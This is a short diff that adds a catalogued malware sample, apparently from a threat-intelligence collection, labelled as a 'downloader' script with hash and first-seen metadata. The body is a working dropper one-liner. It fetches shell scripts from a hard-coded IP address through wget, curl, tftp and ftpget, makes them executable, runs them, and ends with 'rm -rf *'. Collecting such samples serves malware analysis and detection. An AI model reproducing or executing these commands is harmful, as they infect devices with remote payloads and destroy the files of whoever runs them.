@@ -1,0 +1,10 @@
+# sha256: d40cf6a8cb81083387b59b0a0b00ec6ba8667d8b6af7cfe9546171e53a4958b5
+# family: downloader
+# kind: script
+# size_bytes: 386
+# first_seen: 2026-07-25 01:26:15.192993 UTC
+# times_seen: 1
+# yara_matches: none
+# ------------------------------------------------------------
+
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://41.216.189.236/nz.sh; curl -O http://41.216.189.236/nz.sh; chmod 777 nz.sh; sh nz.sh; tftp 41.216.189.236 -c get nz.sh; chmod 777 nz.sh; sh nz.sh; tftp -r 3.sh -g 41.216.189.236; chmod 777 3.sh; sh 3.sh; ftpget -v -u anonymous -p anonymous -P 21 41.216.189.236 2.sh 2.sh; sh 2.sh; rm -rf nz.sh nz.sh 3.sh 2.sh; rm -rf *
